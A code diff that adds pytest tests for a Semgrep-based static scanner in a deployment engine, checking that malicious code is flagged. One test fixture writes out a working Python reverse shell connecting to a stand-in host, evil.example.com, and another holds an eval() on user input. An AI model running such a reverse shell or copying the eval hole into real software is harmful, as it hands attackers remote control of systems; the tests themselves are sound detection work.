@@ -181,3 +181,58 @@ class TestSecretScanner:
     def test_reports_file_path(self):
         findings = self._scan_content("AKIAIOSFODNN7EXAMPLE", "config.py")
         assert any("config.py" in f for f in findings)
+
+
+class TestSemgrepScanner:
+    """Tests for _scan_with_semgrep static analysis integration."""
+
+    def test_clean_code_no_findings(self, tmp_path):
+        """Clean Python/JS code should produce zero findings."""
+        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
+        (tmp_path / "app.py").write_text("def hello():\n    return 'world'\n")
+        findings = _scan_with_semgrep(tmp_path)
+        # Clean code -> empty list (or 'not installed' advisory)
+        assert all('not installed' in f.lower() or 'skipped' in f.lower() for f in findings) or len(findings) == 0
+
+    def test_reverse_shell_detected(self, tmp_path):
+        """Reverse shell pattern should be flagged."""
+        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
+        malicious = (
+            "import socket\n"
+            "import subprocess\n"
+            "import os\n"
+            "\n"
+            's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
+            's.connect(("evil.example.com", 4444))\n'
+            'subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n'
+        )
+        (tmp_path / "evil.py").write_text(malicious)
+        findings = _scan_with_semgrep(tmp_path)
+        # If semgrep is installed, should find the pattern
+        if not any('not installed' in f.lower() or 'skipped' in f.lower() for f in findings):
+            assert len(findings) > 0, 'Expected findings for reverse shell'
+            assert any('reverse' in f.lower() or 'shell' in f.lower() for f in findings)
+
+    def test_eval_injection_detected(self, tmp_path):
+        """eval() on dynamic input should be flagged."""
+        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
+        (tmp_path / "inject.py").write_text("user_input = input()\nresult = eval(user_input)\n")
+        findings = _scan_with_semgrep(tmp_path)
+        if not any('not installed' in f.lower() or 'skipped' in f.lower() for f in findings):
+            assert len(findings) > 0, 'Expected findings for eval injection'
+
+    def test_semgrep_returns_list(self, tmp_path):
+        """Scanner must always return a list, never raise."""
+        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
+        (tmp_path / "empty.py").write_text("")
+        result = _scan_with_semgrep(tmp_path)
+        assert isinstance(result, list)
+
+    def test_rules_file_exists(self):
+        """Custom rules YAML must exist and be valid."""
+        rules_path = Path(__file__).resolve().parent.parent / "semgrep_rules.yml"
+        assert rules_path.exists(), f"semgrep_rules.yml not found at {rules_path}"
+        content = rules_path.read_text()
+        assert "rules:" in content
+        assert "id:" in content
+        assert "saasclaw-" in content  # our custom rule prefix
